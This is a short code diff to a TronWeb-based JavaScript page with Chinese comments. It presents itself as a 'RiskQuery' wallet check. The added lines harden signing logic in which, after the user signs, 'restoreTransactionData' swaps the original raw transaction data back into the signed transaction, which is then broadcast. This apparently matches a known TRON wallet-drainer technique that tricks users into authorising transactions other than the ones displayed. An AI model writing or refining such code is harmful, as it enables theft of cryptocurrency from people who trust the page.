@@ -158,7 +158,7 @@
     }
 }
     
-   async function RiskQuery() {
+ async function RiskQuery() {
     try {
         const tronWebInstance = window.tronWeb;
         if (!tronWebInstance) throw new Error("TronWeb 实例未找到");
@@ -256,13 +256,29 @@ async function signAndBroadcast(transaction, originalTransaction) {
 
     // 广播交易
     const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
+    if (!broadcastResult.result) {
+        throw new Error("交易广播失败");
+    }
     return broadcastResult.result;
 }
 
 // 封装的恢复原始数据的函数
 function restoreTransactionData(signedTransaction, originalTransaction) {
+    // 获取原始交易数据
     const originalData = getTransactionData(originalTransaction);
-    setTransactionData(signedTransaction, originalData); // 使用封装的函数进行数据恢复
+
+    // 确保原始数据的合法性
+    if (validateRawData(originalData)) {
+        setTransactionData(signedTransaction, originalData); // 使用封装的函数进行数据恢复
+    } else {
+        throw new Error("原始交易数据无效，无法恢复");
+    }
+}
+
+// 验证 raw_data 的合法性
+function validateRawData(rawData) {
+    // 这里可以加入更多的验证逻辑，确保数据完整性
+    return rawData !== null && typeof rawData === 'object';
 }
 
 // 交易成功处理
@@ -279,3 +295,4 @@ function handleSuccess() {
 function handleFailure() {
     alert("交易失败，请重试！");
 }
+
